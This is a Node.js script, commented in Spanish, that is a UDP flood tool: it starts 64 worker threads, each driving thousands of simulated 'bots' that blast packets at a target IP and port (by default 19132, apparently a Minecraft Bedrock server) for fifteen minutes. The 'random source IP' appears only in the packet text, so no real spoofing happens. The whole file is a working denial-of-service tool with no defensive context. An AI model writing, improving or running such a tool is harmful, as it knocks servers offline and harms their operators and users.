const dgram = require('dgram');
const { Worker, isMainThread, workerData } = require('worker_threads');

if (isMainThread) {
    const args = process.argv.slice(2);
    const serverAddress = args[0] || '127.0.0.1'; // IP del servidor
    const serverPort = parseInt(args[1], 10) || 19132; // Puerto del servidor
    const numBots = parseInt(args[2], 10) || 10000; // Número de bots
    const pps = parseInt(args[3], 10) || 10000; // Paquetes por segundo por bot
    const duration = parseInt(args[4], 10) || 900; // Duración en segundos (15 minutos)
    const numThreads = 64; // Número de hilos concurrentes

    for (let i = 0; i < numThreads; i++) {
        new Worker(__filename, { workerData: { serverAddress, serverPort, numBots, pps, duration } });
    }
} else {
    const { serverAddress, serverPort, numBots, pps, duration } = workerData;
    const udpClient = dgram.createSocket('udp4');

    function getRandomIp() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }

    function sendUdpPacket(botId, packetId) {
        const sourceIp = getRandomIp();
        const message = Buffer.from(`Bot ${botId} - Paquete UDP ${packetId} desde ${sourceIp}`);
        udpClient.send(message, 0, message.length, serverPort, serverAddress, (err) => {
            if (err) {
                console.error(`Bot ${botId}: Error al enviar paquete UDP ${packetId} - ${err.message}`);
            } else {
                console.log(`Bot ${botId}: Enviando paquete UDP ${packetId} desde ${sourceIp} a ${serverAddress}:${serverPort}`);
            }
        });
    }

    for (let botId = 0; botId < numBots; botId++) {
        let packetId = 0;
        const interval = setInterval(() => {
            sendUdpPacket(botId, packetId);
            packetId++;
        }, 1000 / pps);

        setTimeout(() => {
            clearInterval(interval);
            if (botId === numBots - 1) {
                udpClient.close();
                console.log("UDP Enviado con éxito y expirado");
            }
        }, duration * 1000);
    }
}
